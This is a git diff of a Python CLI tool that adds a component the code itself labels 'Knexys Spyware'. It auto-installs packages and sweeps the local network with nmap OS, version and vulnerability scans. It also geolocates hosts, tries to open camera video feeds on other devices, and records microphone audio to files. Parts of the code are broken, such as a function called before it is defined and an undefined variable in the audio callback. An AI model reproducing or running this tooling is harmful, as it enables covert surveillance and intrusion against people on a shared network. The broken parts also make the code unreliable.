@@ -53,144 +53,303 @@ def KnexysCLI():
 			except Exception as e:
 				pass
 
-	def Cams():
-		import cv2
-		import socket
-		def get_local_ip():
+	def KSW():
+		def Pip():
+			import os
+			import subprocess
+			import sys
+			import platform
+			import urllib.request
 			try:
-				s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-				s.connect(("8.8.8.8", 80))
-				local_ip = s.getsockname()[0]
-				s.close()
-				return local_ip
-			except Exception as e:
-				print(f"Error getting local IP address: {e}")
-				return None
-
-		def find_webcams():
-			local_ip = get_local_ip()
-			if local_ip:
-				network_prefix = '.'.join(local_ip.split('.')[:-1]) + '.'
-
-				webcams = []
-				for i in range(1, 255):
-					ip_address = network_prefix + str(i)
+				subprocess.run([sys.executable, '-m', 'ensurepip', '--default-pip'], check=True)
+				pass
+			except Exception as eI:
+				print("Error_002")
+				try:
+					urllib.request.urlretrieve('https://bootstrap.pypa.io/get-pip.py', 'get-pip.py')
+					subprocess.run([sys.executable, 'get-pip.py'], check=True)
+					pass
+				except Exception as eII:
+					print("Error_002")
 					try:
-						with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
-							s.settimeout(0.1)
-							s.connect((ip_address, 554))
-							webcams.append(ip_address)
-					except (socket.timeout, ConnectionRefusedError):
+						subprocess.run(['easy_install', 'pip'], check=True)
 						pass
+					except Exception as eIII:
+						print("Error_002")
 
-				return webcams
-			else:
-				return []
+		def Download():
+			import os
+			packages = ['requests','python-nmap','tqdm','opencv-python','sounddevice','soundfile']
+			for package in packages:
+				try:
+					os.system(f'pip install {package}')
+				except Exception as e:
+					pass
 
-		webcams = find_webcams()
-		if not webcams:
-			print("No webcams found on the network.")
-			return
-
-		for ip_address in webcams:
-			cap = cv2.VideoCapture(f"rtsp://{ip_address}/onvif1")
-			while True:
-				ret, frame = cap.read()
-				if not ret:
-					print(f"Could not read frame from webcam {ip_address}")
-					break
-
-				cv2.imshow(f"Webcam {ip_address}", frame)
-
-				if cv2.waitKey(1) & 0xFF == ord('q'):
-					break
-
-			cap.release()
-			cv2.destroyAllWindows()
-
-	def Scan_Info():
-		import os
-		import platform
-		import subprocess
-		import sys
-		import urllib.request
-		import socket
-		def get_owner_name(ip_address):
+		def Scan_Data():
+			import os
+			import platform
+			import subprocess
+			import socket
+			import requests
+			import ipaddress
+			from tqdm import tqdm
+			import nmap
 			try:
-				hostname, _, _ = socket.gethostbyaddr(ip_address)
-				return hostname
-			except (socket.timeout, ConnectionRefusedError, socket.herror):
-				return 'Unknown_Hostname.'
+				import requests
+				import nmap
+				from tqdm import tqdm
+			except ImportError:
+				print("Installing required packages...")
+				subprocess.run(["pip", "install", "requests", "python-nmap", "tqdm"])
+				print("Packages installed successfully!")
 
-		def get_local_ip():
-			return socket.gethostbyname(socket.gethostname())
+			def get_owner_name(ip_address):
+				try:
+					hostname, _, _ = socket.gethostbyaddr(ip_address)
+					return hostname
+				except (socket.timeout, ConnectionRefusedError, socket.herror):
+					return 'Unknown_Hostname'
 
-		def get_public_ip():
+			def get_local_ip():
+				return socket.gethostbyname(socket.gethostname())
+
+			def get_public_ip():
+				try:
+					response = requests.get('https://api.ipify.org')
+					return response.text
+				except Exception:
+					return 'Unknown_Public_IP'
+
+			def get_geolocation(ip_address):
+				try:
+					url = f"http://ip-api.com/json/{ip_address}"
+					response = requests.get(url)
+					data = response.json()
+					return data
+				except Exception:
+					return 'Geolocation not available'
+
+			def scan_network(network):
+				nm = nmap.PortScanner()
+				nm.scan(hosts=network, arguments='-sP')
+
+				active_hosts = []
+
+				for host in nm.all_hosts():
+					if nm[host]['status']['state'] == 'up':
+						active_hosts.append(host)
+
+				return active_hosts
+
+			def scan_host(ip_address):
+				try:
+					nm = nmap.PortScanner()
+					nm.scan(hosts=ip_address, arguments='-O -sV --script vuln')
+
+					if ip_address in nm.all_hosts():
+						return nm[ip_address]
+					else:
+						return None
+				except Exception as e:
+					print(f"Error scanning host {ip_address}: {e}")
+					return None
+
+			devices = []
+			local_ip = get_local_ip()
+			network_prefix = '.'.join(local_ip.split('.')[:-1]) + '.'
+
+			for i in range(1, 255):
+				ip_address = network_prefix + str(i)
+				try:
+					with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+						s.settimeout(0.1)
+						s.connect((ip_address, 80))
+						owner_name = get_owner_name(ip_address)
+						public_ip = get_public_ip()
+						device_info = scan_host(ip_address)
+						geolocation = get_geolocation(ip_address)
+						devices.append({
+							'IP': ip_address,
+							'Hostname': owner_name,
+							'Public_IP': public_ip,
+							'Device_Info': device_info,
+							'Geolocation': geolocation
+						})
+				except (socket.timeout, ConnectionRefusedError):
+					pass
+
+			print("Obtained Information:")
+			for device in devices:
+				print(f"IP: {device['IP']}")
+				print(f"Hostname: {device['Hostname']}")
+				print(f"Public IP: {device['Public_IP']}")
+				print(f"Device Info: {device['Device_Info']}")
+				print(f"Geolocation: {device['Geolocation']}\n")
+
+		def Cams():
+			import cv2
+			import requests
+			import socket
+			import nmap
+			import concurrent.futures
+			import logging
+			logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
+
+			def get_local_ip():
+				try:
+					return socket.gethostbyname(socket.gethostname())
+				except Exception as e:
+					logging.error(f"Error getting local IP address: {e}")
+					return None
+
+			def discover_devices():
+				devices = []
+
+				nm = nmap.PortScanner()
+
+				try:
+					logging.info("Scanning network for devices...")
+					nm.scan(arguments='-sn', timeout=30)
+					logging.info("Scan completed.")
+				except Exception as e:
+					logging.error(f"Error scanning network: {e}")
+					return []
+
+				for host in nm.all_hosts():
+					try:
+						hostname = nm[host].hostname() if 'hostname' in nm[host] else 'Unknown_Hostname'
+						devices.append({'IP': host, 'Hostname': hostname})
+					except Exception as e:
+						logging.error(f"Error processing host {host}: {e}")
+
+				return devices
+
+			def access_camera(ip_address):
+				web_interface_url = f"http://{ip_address}/login"
+				try:
+					response = requests.get(web_interface_url, timeout=10)
+					if response.status_code == 200:
+						video_url = response.json().get('video_url')
+						if video_url:
+							cap = cv2.VideoCapture(video_url)
+							if cap.isOpened():
+								while True:
+									ret, frame = cap.read()
+									if ret:
+										cv2.imshow('Camera Feed', frame)
+										if cv2.waitKey(1) & 0xFF == ord('q'):
+											break
+									else:
+										break
+								cap.release()
+								cv2.destroyAllWindows()
+							else:
+								logging.warning(f"Failed to open video stream from camera at IP: {ip_address}")
+						else:
+							logging.warning(f"No video stream URL found for camera at IP: {ip_address}")
+					else:
+						logging.warning(f"Unable to access camera at IP {ip_address}. HTTP status code: {response.status_code}")
+				except requests.RequestException as e:
+					logging.error(f"Error accessing camera at IP {ip_address}: {e}")
+
+			local_ip = get_local_ip()
+			if not local_ip:
+				logging.error("Failed to obtain local IP address. Exiting.")
+				return
+
+			logging.info(f"Local IP address: {local_ip}")
+
+			devices = discover_devices()
+			if not devices:
+				logging.error("No devices found on the network. Exiting.")
+				return
+
+			logging.info(f"Found {len(devices)} devices on the network.")
+
+			with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
+				futures = [executor.submit(access_camera, device['IP']) for device in devices]
+
+			logging.info("All camera access attempts completed.")
+
+		def Mic():
+			import socket
+			import nmap
+			import concurrent.futures
+			import logging
+			import sounddevice as sd
+			import soundfile as sf
+			logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
 			try:
-				with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
-					s.connect(("8.8.8.8", 80))
-					return s.getsockname()[0]
-			except Exception:
-				return 'Unknown_Public_IP'
+				local_ip = socket.gethostbyname(socket.gethostname())
+			except Exception as e:
+				logging.error(f"Failed to obtain local IP address: {e}")
+				return
 
-		def get_device_info(ip_address):
+			logging.info(f"Local IP address: {local_ip}")
 			try:
-				info = subprocess.check_output(['nmap', '-O', ip_address], stderr=subprocess.DEVNULL)
-				return info.decode('utf-8')
-			except Exception:
-				return 'Device info not available.'
+				nm = nmap.PortScanner()
+				nm.scan(arguments='-sn', timeout=30)
+				devices = [{'IP': host, 'Hostname': nm[host].hostname() if 'hostname' in nm[host] else 'Unknown_Hostname'} for host in nm.all_hosts()]
+			except Exception as e:
+				logging.error(f"Error scanning network: {e}")
+				return
 
-		def get_vulnerabilities(ip_address):
+			if not devices:
+				logging.error("No devices found on the network. Exiting.")
+				return
+
+			logging.info(f"Found {len(devices)} devices on the network.")
+			with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
+				for device in devices:
+					executor.submit(access_microphone, device['IP'])
+
+			logging.info("All microphone access attempts completed.")
+
+			def access_microphone(ip_address):
+				logging.info(f"Listening to microphone at IP address: {ip_address}")
+
+			def callback(indata, frames, time, status):
+				if status:
+					logging.warning(f"Error in audio stream: {status}")
+				filename = f'recorded_audio_{ip_address}.wav'
+				with sf.SoundFile(filename, mode='w', samplerate=44100, channels=1) as file:
+					file.write(indata)
 			try:
-				vulnerabilities = subprocess.check_output(['nmap', '--script', 'vuln', ip_address], stderr=subprocess.DEVNULL)
-				return vulnerabilities.decode('utf-8')
-			except Exception:
-				return 'Vulnerabilities not available.'
-
-		def get_geolocation(ip_address):
-			try:
-				url = f"http://ip-api.com/json/{ip_address}"
-				response = urllib.request.urlopen(url)
-				data = response.read().decode('utf-8')
-				return data
-			except Exception:
-				return 'Geolocation not available.'
-
-		devices = []
-		local_ip = get_local_ip()
-		network_prefix = '.'.join(local_ip.split('.')[:-1]) + '.'
-
-		for i in range(1, 255):
-			ip_address = network_prefix + str(i)
-			try:
-				with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
-					s.settimeout(0.1)
-					s.connect((ip_address, 80))
-					owner_name = get_owner_name(ip_address)
-					public_ip = get_public_ip()
-					device_info = get_device_info(ip_address)
-					vulnerabilities = get_vulnerabilities(ip_address)
-					geolocation = get_geolocation(ip_address)
-					devices.append({
-						'IP': ip_address,
-						'Hostname': owner_name,
-						'Public_IP': public_ip,
-						'Device_Info': device_info,
-						'Vulnerabilities': vulnerabilities,
-						'Geolocation': geolocation
-					})
-			except (socket.timeout, ConnectionRefusedError):
+				with sd.InputStream(callback=callback):
+					sd.sleep(100000)
+			except KeyboardInterrupt:
 				pass
 
-		print("Obtained Information:")
-		for device in devices:
-			print(f"IP: {device['IP']}")
-			print(f"Hostname: {device['Hostname']}")
-			print(f"Public IP: {device['Public_IP']}")
-			print(f"Device Info: {device['Device_Info']}")
-			print(f"Vulnerabilities: {device['Vulnerabilities']}")
-			print(f"Geolocation: {device['Geolocation']}\n")
-		return devices
+		def Clear():
+			import os
+			import platform
+			ms = [
+				'cls' if platform.system() == 'Windows' else 'clear',
+				'tput clear',
+				'reset'
+			]
+			for m in ms:
+				try:
+					os.system(m)
+					break
+				except Exception as e:
+					continue
+			else:
+				pass
+
+		def Begin():
+			print("Activating KSW (Knexys Spyware).")
+			print("This may take a moment...")
+			Pip()
+			Download()
+			Scan_Data()
+			Cams()
+			Mic()
+			return()
+
+		Begin()
+		return()
 
 	def ChangeText(text):
 		import os
@@ -233,7 +392,6 @@ def KnexysCLI():
 		print("Default Passcode is '0000'.")
 		PasscodeI()
 
-
 	def List():
 		print("'File Create', Create a file.")
 		print("'File Read', Read a file.")
@@ -248,8 +406,7 @@ def KnexysCLI():
 		print("'Restart', Restart this program.")
 		print("'Status', Tests if the code works.")
 		print("'Version', Shows the version of this program.")
-		print("'Scan_Info', Attempt to scan info of users on your network.")
-		print("'Cams', Find and open webcams on your network.")
+		print("'Spyware', Attempt to scan info of users on your network.")
 
 	def FileCreateA():
 		global FA
@@ -472,26 +629,9 @@ def KnexysCLI():
 			Command()
 		elif ("Permissions" == Beta):
 			Ed()
-		elif ("Scan_Info" == Beta):
+		elif ("Spyware" == Beta):
 			if (Alpha == X):
-				print("Scanning IPs... This could take a moment.")
-				Scan_Info()
-				Command()
-			else:
-				print("You do not have the correct permissions for this command.")
-				Command()
-		elif ("Cams" == Beta):
-			if (Alpha == X):
-				print("Finding Cameras...")
-				Cams()
-				Command()
-			else:
-				print("You do not have the correct permissions for this command.")
-				Command()
-		elif ("Mic" == Beta):
-			if (Alpha == X):
-				print("Finding Microphones...")
-				Mic()
+				KSW()
 				Command()
 			else:
 				print("You do not have the correct permissions for this command.")
@@ -595,6 +735,7 @@ def KnexysCLI():
 		Pip()
 		Download()
 		Clear()
+		print(" ")
 		Restart()
 
 	Start()
